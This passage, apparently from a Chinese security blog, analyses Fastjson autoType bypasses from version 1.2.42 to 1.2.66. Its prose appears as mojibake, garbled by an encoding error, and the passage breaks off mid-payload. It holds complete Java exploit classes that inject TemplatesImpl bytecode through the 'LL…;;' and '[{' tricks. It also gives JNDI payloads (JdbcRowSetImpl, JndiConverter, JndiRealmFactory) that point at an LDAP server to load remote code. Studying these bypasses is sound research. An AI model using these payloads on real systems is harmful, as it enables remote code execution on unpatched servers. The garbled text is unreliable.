ï¼Œå¦‚æœç±»åçš„å­—ç¬¦ä¸²ä»¥Lå¼€å¤´å¹¶ä»¥;ç»“å°¾ï¼Œåˆ™è¯´æ˜è¯¥ç±»æ˜¯ä¸€ä¸ªæ™®é€šçš„Javaç±»ï¼Œéœ€è¦æŠŠå¼€å¤´çš„Lå’Œç»“å°¾çš„;ç»™å»æ‰ï¼Œç„¶åé€’å½’è°ƒç”¨loadClass</p><p>é‚£å…¶å®å°±å¾ˆæ¸…æ™°äº†ï¼Œå¾ˆå®¹æ˜“å°±æ˜ç™½æˆ‘ä»¬å‰é¢payloadçš„ç»•è¿‡åŸç†</p><blockquote><p>ä¸ç”¨[çš„åŸå› æ˜¯fastjsonåœ¨å‰é¢å·²ç»åˆ¤æ–­è¿‡æ˜¯å¦ä¸ºæ•°ç»„äº†ï¼Œå®é™…èµ°ä¸åˆ°è¿™ä¸€æ­¥</p></blockquote><p>ç»•è¿‡å°±ä¸¤æ­¥</p><ol><li>å¼€å¯autoTypeSupport</li><li>Lå¼€å¤´;ç»“å°¾</li></ol><p>ä¸è¿‡è¿™ä¸ªå‚æ•°è¦åœ¨æœåŠ¡ç«¯æ‰‹åŠ¨å¼€å¯ï¼Œé»˜è®¤ä¸ºfalseå¯ç”¨ç™½åå•ï¼Œæœ‰ç‚¹ä¸å¥½åˆ©ç”¨æˆ‘æ„Ÿè§‰</p><h1><span id="fastjson1242">FastJson1.2.42</span></h1><p>è¯¥ç‰ˆæœ¬ä¿®æ”¹äº†ä¸‹é¢ä¸¤ç‚¹ï¼š</p><ul><li>é»‘åå•æ”¹ä¸ºäº†hashå€¼ï¼Œé˜²æ­¢ç»•è¿‡</li><li>å¯¹äºä¼ å…¥çš„ç±»åï¼Œåˆ é™¤å¼€å¤´<code>L</code>å’Œç»“å°¾çš„<code>;</code></li></ul><p><img src="https://cdn.clown2024.cn/202408310051883.png" alt="image-20240831005115787"></p><blockquote><p>ç¬‘æ­»äº†ï¼Œæ–‡ç« è¿˜æ²¡çœ‹å®ŒçŒœæµ‹æ˜¯ä¸æ˜¯å°±æå‰æ ¡éªŒåˆ äº†ä¸€æ¬¡ï¼Œç›´æ¥çŒœåŒå†™èƒ½ä¸èƒ½ç»•è¿‡ï¼Œç»“æœçœŸç»•è¿‡å»äº†ğŸ¤£</p></blockquote><p>çœ‹ä¸€ä¸‹ä»–çš„checkAutoTypeå‡½æ•°å˜åŒ–</p><p><img src="https://cdn.clown2024.cn/202408311524654.png" alt="image-20240831152406512"></p><p>æ€»ä¹‹è¿™é‡Œå°±æ˜¯å¯¹å­—ç¬¦ä¸²è¿›è¡Œäº†æˆªå–ä½†åªæˆªå–äº†ä¸€æ¬¡</p><p>TemplatesImplçš„expå¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Templates;<br><br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.*;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-comment">//FastJson1.2.42</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">readClass</span><span class="hljs-params">(String cls)</span>&#123;<br>        <span class="hljs-type">byte</span>[] buffer = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(cls);<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-type">int</span> n;<br>            <span class="hljs-keyword">while</span>((n = fis.read(b))!=-<span class="hljs-number">1</span>) &#123;<br>                bos.write(b,<span class="hljs-number">0</span>,n);<br>            &#125;<br>            fis.close();<br>            bos.close();<br>            buffer = bos.toByteArray();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        Base64.<span class="hljs-type">Encoder</span> <span class="hljs-variable">encoder</span> <span class="hljs-operator">=</span> Base64.getEncoder();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> encoder.encodeToString(buffer);<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">evilClassPath</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;user.dir&quot;</span>) + <span class="hljs-string">&quot;\\target\\classes\\org\\clown\\Templates\\Evil.class&quot;</span>;<br>            System.out.println(evilClassPath);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">evilCode</span> <span class="hljs-operator">=</span> readClass(evilClassPath);<br>            ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>); <span class="hljs-comment">//å¼€å¯AutoTypeSupport</span><br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">NASTY_CLASS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;LLcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;;&quot;</span>; <span class="hljs-comment">//å‰é¢åŠ äº†Lï¼Œç»“å°¾åŠ äº†; è¿›è¡Œäº†åŒå†™ç»•è¿‡</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +<br>                    <span class="hljs-string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="hljs-string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;&quot;</span>;<br><br>            JSON.parseObject(payload, Feature.SupportNonPublicField);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1><span id="fastjson1243">FastJson1.2.43</span></h1><p>è¿™ä¸ªç‰ˆæœ¬åˆæ˜¯ä¿®æ”¹äº†checkAutoTypeå‡½æ•°ï¼Œè¿™æ¬¡å¯¹äºLLç­‰å¼€å¤´ç»“å°¾çš„å­—ç¬¦ä¸²ç›´æ¥æŠ›å‡ºå¼‚å¸¸</p><p>ä¸Šé¢payloadæ‰§è¡Œç»“æœ</p><p><img src="https://cdn.clown2024.cn/202408311527303.png" alt="image-20240831152750175"></p><p>çœ‹ä¸€ä¸‹checkAutoTypeå‡½æ•°</p><p><img src="https://cdn.clown2024.cn/202408311530201.png" alt="image-20240831153008103"></p><p>è¿™é‡Œç›´æ¥å°±æŠ›å¼‚å¸¸äº†</p><p>ä½†æ˜¯æ²¡æœ‰å¯¹[è¿›è¡Œé™åˆ¶ï¼Œå¯ä»¥é€šè¿‡[{æ¥ç»•è¿‡ï¼Œæ”¹åçš„expå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Templates;<br><br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.*;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-comment">//FastJson1.2.43</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">readClass</span><span class="hljs-params">(String cls)</span>&#123;<br>        <span class="hljs-type">byte</span>[] buffer = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(cls);<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-type">int</span> n;<br>            <span class="hljs-keyword">while</span>((n = fis.read(b))!=-<span class="hljs-number">1</span>) &#123;<br>                bos.write(b,<span class="hljs-number">0</span>,n);<br>            &#125;<br>            fis.close();<br>            bos.close();<br>            buffer = bos.toByteArray();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        Base64.<span class="hljs-type">Encoder</span> <span class="hljs-variable">encoder</span> <span class="hljs-operator">=</span> Base64.getEncoder();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> encoder.encodeToString(buffer);<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">evilClassPath</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;user.dir&quot;</span>) + <span class="hljs-string">&quot;\\target\\classes\\org\\clown\\Templates\\Evil.class&quot;</span>;<br>            System.out.println(evilClassPath);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">evilCode</span> <span class="hljs-operator">=</span> readClass(evilClassPath);<br>            ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>); <span class="hljs-comment">//å¼€å¯AutoTypeSupport</span><br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">NASTY_CLASS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>; <span class="hljs-comment">//ç”¨[&#123;æ¥ç»•è¿‡</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +<br>                    <span class="hljs-string">&quot;\&quot;[&#123;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="hljs-string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;&quot;</span>;<br><br>            JSON.parseObject(payload, Feature.SupportNonPublicField);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202408311541263.png" alt="image-20240831154143113"></p><p>åˆ†æä¸€ä¸‹è¿™ä¸ªpayloadçš„åŸç†ï¼Œé¦–å…ˆå‰é¢æˆ‘ä»¬çŸ¥é“åªåŠ ä¸€ä¸ª[æ˜¯å¯ä»¥è¿›å…¥loadClassé‡Œé¢çš„ï¼Œä½†æ˜¯æ­¤æ—¶ä¼šjsonè§£æé”™è¯¯</p><p><img src="https://cdn.clown2024.cn/202408311550012.png" alt="image-20240831155047869"></p><p>è¿™é‡Œè¯´æœŸå¾…ä¸€ä¸ª[ä½†æ˜¯åœ¨ç¬¬ä¸ƒåä¸€ä½ç½®æ˜¯â€™,â€™ï¼Œå°±æ˜¯TemplatesImplåé¢é‚£ä¸ªé€—å·çš„ä½ç½®</p><p>é‚£æˆ‘ä»¬å°±è¡¥ä¸Šä¸€ä¸ª[</p><p><img src="https://cdn.clown2024.cn/202408311554785.png" alt="image-20240831155444662"></p><p>ç„¶ååˆè¯´ç¼ºå°‘ä¸€ä¸ª{ï¼Œé‚£å†è¡¥ä¸Šå»å³å¯</p><blockquote><p>ä¸è¿‡æ€ªæ€ªçš„è¿™å°±èƒ½è§£ææˆåŠŸäº†ï¼ŸğŸ˜¢</p></blockquote><h1><span id="fastjson1225-1247é€šæ€">FastJson1.2.25-1.2.47é€šæ€</span></h1><p><strong>å½±å“ç‰ˆæœ¬</strong></p><p>1.2.25-1.2.32:</p><p>æœªå¼€å¯AutoTypeSupportæ—¶èƒ½æˆåŠŸåˆ©ç”¨ï¼Œå¼€å¯äº†åè€Œä¸è¡Œ</p><p>1.2.33-1.2.47:</p><p>æ— è®ºæ˜¯å¦å¼€å¯AutoTypeSupportéƒ½èƒ½æˆåŠŸåˆ©ç”¨</p><p><strong>å…¶ä»–çš„é™åˆ¶</strong></p><p>åŸºäºRMIåˆ©ç”¨çš„JDKç‰ˆæœ¬&lt;&#x3D;6u141ã€7u131ã€8u121ï¼ŒåŸºäºLDAPåˆ©ç”¨çš„JDKç‰ˆæœ¬&lt;&#x3D;6u211ã€7u201ã€8u191</p><h2><span id="1225ltx3dfastjsonltx3d1232">1.2.25&lt;&#x3D;Fastjson&lt;&#x3D;1.2.32</span></h2><p>å…ˆç»™å‡ºexpï¼Œè¿™é‡Œç”¨çš„JdbcRowSetImplçš„é“¾å­</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Fastjson6</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;a\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;b\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:9999/zoZdyoJH\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;autoCommit\&quot;:true\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202408311634449.png" alt="image-20240831163451309"></p><p>æ•´ä½“æ€è·¯ï¼šé€šè¿‡java.lang.Classï¼Œå°†JdbcRowSetImplç±»åŠ è½½åˆ°Mapä¸­ç¼“å­˜ï¼Œä»è€Œç»•è¿‡AutoTypeçš„æ£€æµ‹ã€‚å› æ­¤å°†payloadåˆ†ä¸¤æ¬¡å‘é€ï¼Œç¬¬ä¸€æ¬¡åŠ è½½ï¼Œç¬¬äºŒæ¬¡æ‰§è¡Œã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œåªè¦é‡åˆ°æ²¡æœ‰åŠ è½½åˆ°ç¼“å­˜çš„ç±»ï¼ŒcheckAutoType()å°±ä¼šæŠ›å‡ºå¼‚å¸¸ç»ˆæ­¢ç¨‹åºã€‚</p><p>å»çœ‹ä¸€ä¸‹ä»–çš„checkAutoTypeå‡½æ•°æ¥åˆ†æä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202408311638035.png" alt="image-20240831163822049"></p><p>æˆ‘ä»¬å…ˆä»ç¼“å­˜ä¸­å»è·å–è¿™ä¸ªç±»ï¼Œç„¶åä¸ºnullç›´æ¥åˆ°findClassè¿™é‡Œï¼Œè¿™é‡Œçš„ç¼“å­˜mappingåœ¨ä¸€å¼€å§‹çš„æ—¶å€™ä¼šè‡ªåŠ¨æ‰§è¡Œé™æ€ä»£ç å—æ”¾ä¸€äº›ç±»è¿›å»</p><p><img src="https://cdn.clown2024.cn/202408311643708.png" alt="image-20240831164311603"></p><p>ç„¶åéå†bucketsï¼Œæ ¹æ®é”®å€¼æŸ¥æ‰¾æ˜¯å¦å­˜åœ¨è¯¥ç±»ï¼Œè¿™é‡Œæ˜¯å¯ä»¥ç›´æ¥æ‰¾åˆ°çš„ï¼Œç„¶ååˆ¤æ–­clazzä¸ä¸ºç©ºåç›´æ¥è¿”å›</p><p>ç„¶åä¸€è·¯å¾€ä¸‹èµ°åˆ°deserializeçš„åœ°æ–¹</p><p><img src="https://cdn.clown2024.cn/202408311646395.png" alt="image-20240831164635293"></p><p>è¿™é‡Œè°ƒç”¨çš„æ˜¯**MiscCodec.deserialze()**ï¼Œèµ°è¿›å»è·Ÿè¿›</p><p><img src="https://cdn.clown2024.cn/202408311649743.png" alt="image-20240831164903622"></p><p>å¾€ä¸‹åˆ°è¿™é‡Œï¼Œåˆ¤æ–­é”®å€¼æ˜¯å¦ä¸ºvalï¼Œæ˜¯çš„è¯å†æå–valé”®å¯¹åº”çš„å€¼èµ‹ç»™objValå˜é‡ï¼Œè€ŒobjValåœ¨åé¢ä¼šèµ‹å€¼ç»™strValå˜é‡</p><p><img src="https://cdn.clown2024.cn/202408311650152.png" alt="image-20240831165057048"></p><p>è¿™é‡Œèµ‹å€¼äº†ç»™strVal</p><p>ç„¶åç»§ç»­å¾€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202408311658049.png" alt="image-20240831165810941"></p><p>åˆ¤æ–­clazzæ˜¯å¦ä¸ºClass.classï¼Œç„¶ååˆ°è¿™é‡ŒloadClass</p><p><img src="https://cdn.clown2024.cn/202408311659949.png" alt="image-20240831165951852"></p><p>loadå®Œä¹‹åå°±ä¼šæ”¾å…¥ç¼“å­˜ä¸­</p><p>ç„¶ååœ¨æ‰«æç¬¬äºŒéƒ¨åˆ†JSONæ•°æ®çš„æ—¶å€™ï¼Œç”±äºæˆ‘ä»¬çš„ç±»å·²ç»è¢«æ”¾åœ¨ç¼“å­˜ä¸­äº†ï¼Œæˆ‘ä»¬åœ¨å‰é¢çš„**TypeUtils.getClassFromMapping(typeName)**å°±èƒ½è·å–åˆ°clazzï¼Œç„¶åç›´æ¥è¿”å›</p><p><img src="https://cdn.clown2024.cn/202408311703708.png" alt="image-20240831170308601"></p><p>å¯ä»¥çœ‹åˆ°ç›´æ¥è¿”å›ä»è€Œç»•è¿‡äº†checkAutoType</p><p>ç„¶åå¦‚æœå¼€å¯äº†autoTypeSupportçš„è¯å°±ä¼šæ— æ³•ç»•è¿‡å‰é¢çš„é»‘åå•ï¼Œæ‰€ä»¥å¼€å¯äº†åè€Œä¸è¡Œ</p><p><img src="https://cdn.clown2024.cn/202408311704028.png" alt="image-20240831170428910"></p><h2><span id="1233ltx3dfastjsonltx3d1247">1.2.33&lt;&#x3D;Fastjson&lt;&#x3D;1.2.47</span></h2><p>è¿™éƒ¨åˆ†çš„ç‰ˆæœ¬å¼€äº†autoTypeSupportæ˜¯å¯ä»¥æˆåŠŸ</p><p><strong>æœªå¼€å¯autoTypeæ—¶</strong></p><p>è¿™é‡Œå°±å’Œå‰é¢ä¸€æ ·å°±ä¸ç”¨åˆ†æäº†</p><p><strong>å¼€å¯autoTypeæ—¶</strong></p><p>è¿™é‡ŒcheckAutoTypeæ”¹äº†ä¸€ç‚¹åœ°æ–¹</p><p><img src="https://cdn.clown2024.cn/202408311724426.png" alt="image-20240831172445310"></p><p>è¿™é‡Œå¤šäº†ä¸€ä¸ªåˆ¤æ–­ï¼Œéœ€è¦**TypeUtils.getClassFromMapping(typeName)**è¿”å›ä¸ºnullæ‰è¡Œï¼Œæˆ‘ä»¬è¿™é‡Œè¿”å›ä¸ä¸ºnullè‡ªç„¶ä¹Ÿä¸ä¼šæŠ›å‡ºå¼‚å¸¸</p><h1><span id="fastjson1248-1268">Fastjson1.2.48-1.2.68</span></h1><p>è¿™éƒ¨åˆ†ç‰ˆæœ¬å¾ˆå¤šéƒ½æ˜¯ç”¨é»‘åå•ç»•è¿‡çš„åˆ©ç”¨æ–¹å¼ï¼Œå‚è€ƒæ–‡ç« ï¼š<a href="https://www.anquanke.com/post/id/232774">https://www.anquanke.com/post/id/232774</a></p><h2><span id="fastjsonltx3d1262">Fastjson&lt;&#x3D;1.2.62</span></h2><p>ä¸€æ ·å…ˆç»™ä¸ªpayload</p><p>org.apache.xbean.propertyeditor.JndiConverterç±»çš„toObjectImpl()å‡½æ•°å­˜åœ¨JNDIæ³¨å…¥æ¼æ´</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&quot;@type&quot;:&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;,&quot;AsText&quot;:&quot;ldap://127.0.0.1:9999/zoZdyoJH&quot;&#125;;<br></code></pre></td></tr></table></figure><p>expå¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.JNDITest;<br><br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-comment">//fastjson1.2.62</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Advanced_Version</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.xbean.propertyeditor.JndiConverter\&quot;,\&quot;AsText\&quot;:\&quot;ldap://127.0.0.1:9999/zoZdyoJH\&quot;&#125;&quot;</span>;<br>        JSON.parse(poc);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¯¥åˆ©ç”¨æ–¹å¼è¿˜éœ€è¦æˆ‘ä»¬æ»¡è¶³ä¸€äº›å‰ç½®æ¡ä»¶ï¼š</p><ul><li><p>éœ€è¦å¼€å¯AutoTypeï¼›</p></li><li><p>Fastjson &lt;&#x3D; 1.2.62ï¼›</p></li><li><p>JNDIæ³¨å…¥åˆ©ç”¨æ‰€å—çš„JDKç‰ˆæœ¬é™åˆ¶ï¼›</p></li><li><p>ç›®æ ‡æœåŠ¡ç«¯éœ€è¦å­˜åœ¨xbean-reflectåŒ…ï¼›</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.xbean<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>xbean-reflect<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.18<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ul><p><img src="https://cdn.clown2024.cn/202408312240189.png" alt="image-20240831224018027"></p><p><strong>è°ƒè¯•åˆ†æ</strong></p><p>å…ˆæ ¹æ®payloadçœ‹ä¸€ä¸‹åˆ©ç”¨çš„ç‚¹</p><p>çœ‹ä¸€ä¸‹å…³é”®ç±»<strong>JndiConverter</strong>çš„jndiåˆ©ç”¨ç‚¹</p><p><img src="https://cdn.clown2024.cn/202409010012684.png" alt="image-20240901001248560"></p><p>é‚£å°±æ˜¯éœ€è¦æˆ‘ä»¬çš„setæ–¹æ³•èƒ½å¤Ÿè§¦å‘åˆ°è¯¥ç±»ï¼Œç„¶åçœ‹payloadå¯ä»¥çŸ¥é“æ˜¯è§¦å‘äº†ä¸€ä¸ª<strong>setAsText</strong>æ–¹æ³•ï¼Œä½†æ˜¯è¿™ä¸ªç±»æ²¡æœ‰ï¼Œé‚£å°±åº”è¯¥æ˜¯åœ¨çˆ¶ç±»é‡Œé¢ï¼Œæˆ‘ä»¬å¯ä»¥å¾€ä¸ŠæŸ¥æ‰¾è°ƒç”¨ç±»ï¼Œæœ€ç»ˆæ˜¯æ‰¾åˆ°äº†ä¸€ä¸ª<strong>AbstractConverter</strong>çš„ç±»</p><p><img src="https://cdn.clown2024.cn/202409010015651.png" alt="image-20240901001557551"></p><p><img src="https://cdn.clown2024.cn/202409010016240.png" alt="image-20240901001634139"></p><p>ä»–è¿™é‡Œè°ƒç”¨äº†toObjectæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202409010017706.png" alt="image-20240901001722611"></p><p>ç„¶åè°ƒç”¨äº†toObjectImplæ–¹æ³•ï¼Œæœ€ç»ˆåˆ°æˆ‘ä»¬æ‰§è¡Œjndiçš„åœ°æ–¹</p><p>åˆ©ç”¨é“¾çš„æµç¨‹çŸ¥é“äº†ï¼Œç°åœ¨æ¥çœ‹ä¸€ä¸‹checkAutoTypeå‡½æ•°çš„æµç¨‹ï¼Œä¸»è¦æ˜¯çœ‹çœ‹ä»–æ–°å¢çš„é€»è¾‘ï¼Œè¿™é‡Œåˆ†æçš„æ˜¯å¼€å¯autoTypeSupportçš„æ—¶å€™</p><p><img src="https://cdn.clown2024.cn/202409010028755.png" alt="image-20240901002806625"></p><p>è¿™é‡Œä¼šå…ˆè¿›åˆ°ç¬¬ä¸€éƒ¨åˆ†çš„é»‘ç™½åå•åˆ¤æ–­ï¼Œç”±äºè¯¥ç±»ä¸åœ¨é»‘ç™½åå•å†…å°±ç›´æ¥å¾€ä¸‹èµ°</p><p><img src="https://cdn.clown2024.cn/202409010032724.png" alt="image-20240901003236610"></p><p>ä¸€è·¯èµ°åˆ°è¿™ä¸ªç±»ï¼Œæ­¤æ—¶clazzä¸ºnullä¸”å¼€å¯äº†autoTypeSupportï¼Œå°±ç›´æ¥loadClassï¼Œåé¢å°±æ˜¯æ­£å¸¸çš„ååºåˆ—åŒ–æµç¨‹äº†</p><p><strong>æœªå¼€å¯autoTypeSupport</strong></p><p><img src="https://cdn.clown2024.cn/202409010037003.png" alt="image-20240901003743874"></p><p>ä»–ä¼šè¿›åˆ°è¿™é‡Œçš„åˆ¤æ–­é€»è¾‘ï¼Œä¹Ÿæ˜¯æ­£å¸¸çš„é»‘ç™½åå•æ ¡éªŒç›´æ¥è¿‡å»ï¼Œä¸»è¦çš„æ˜¯ä»–ä¼šèµ°åˆ°ä¸‹é¢è¿™ä¸ªåœ°æ–¹</p><p><img src="https://cdn.clown2024.cn/202409010039269.png" alt="image-20240901003925151"></p><p>è¿™é‡Œä¼šç›´æ¥æŠ›å¼‚å¸¸æ‰€ä»¥ä¹Ÿå°±ä¸ä¼šloadClassäº†</p><h2><span id="fastjson1266">Fastjson1.2.66</span></h2><p>è¯¥ç‰ˆæœ¬ä¹Ÿæ˜¯é»‘åå•ç»•è¿‡ï¼Œ1.2.66æ¶‰åŠå¤šæ¡Gadgeté“¾ï¼ŒåŸç†éƒ½æ˜¯å­˜åœ¨JDNIæ³¨å…¥æ¼æ´ã€‚</p><p>ç»™å‡ºå„é“¾å­çš„payload</p><p>org.apache.shiro.realm.jndi.JndiRealmFactoryç±»PoCï¼š</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.shiro.realm.jndi.JndiRealmFactory&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;jndiNames&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span 